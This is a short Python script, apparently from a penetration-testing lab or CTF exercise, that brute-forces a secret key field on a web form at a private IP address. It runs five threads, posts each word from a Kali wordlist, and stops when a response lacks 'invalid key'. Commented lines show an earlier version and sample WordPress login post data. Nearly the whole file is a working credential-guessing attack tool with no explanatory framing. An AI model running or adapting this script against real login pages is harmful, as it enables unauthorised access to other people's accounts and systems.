import requests
import queue
import threading
import sys

# https://stackoverflow.com/questions/25091976/python-requests-get-cookies
# session = requests.Session()


# <form method="post" action="index.php">
# Key:<br>
# <input type="password" name="key">
# </form> 
# </center>

# response = session.get('http://192.168.0.12/wp-login.php')
# cookies = session.cookies.get_dict()

# log=bttai&pwd=buitai&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.0.12%2Fwp-admin%2F&testcookie=1


# data = {}
		   

# count = 1
# for key in raw_words.split():
# 	data['key'] = key

# 	response = requests.post('http://192.168.0.15/kzMb5nVYJw/index.php', data=data)
# 	if "invalid key" not in response.text:
# 		print("[*] " +key)
# 		break
# 	else:
# 		print("["+str(count)+"] " + key)

# 	count = count + 1


def test(words):
	cnt = 1
	while not words.empty():
		key = f'{words.get()}'
		# print(f'[{cnt}] {key}')
		cnt = cnt + 1
		data = {}
		data['key'] = f'{key}'
		response = requests.post('http://192.168.0.15/kzMb5nVYJw/index.php', data=data)
		if "invalid key" not in response.text:
			print("[*] " +key)
			exit()




if __name__ == '__main__':
	with open("/home/kali/OSPC/Tools/password.lst", "r") as f:
		raw_words = f.read()

	words = queue.Queue()
	for key in raw_words.split():
		# print(f'{key}')
		words.put(f'{key}')

	for _ in range(5):
		t = threading.Thread(target=test, args=(words,))
		t.start()



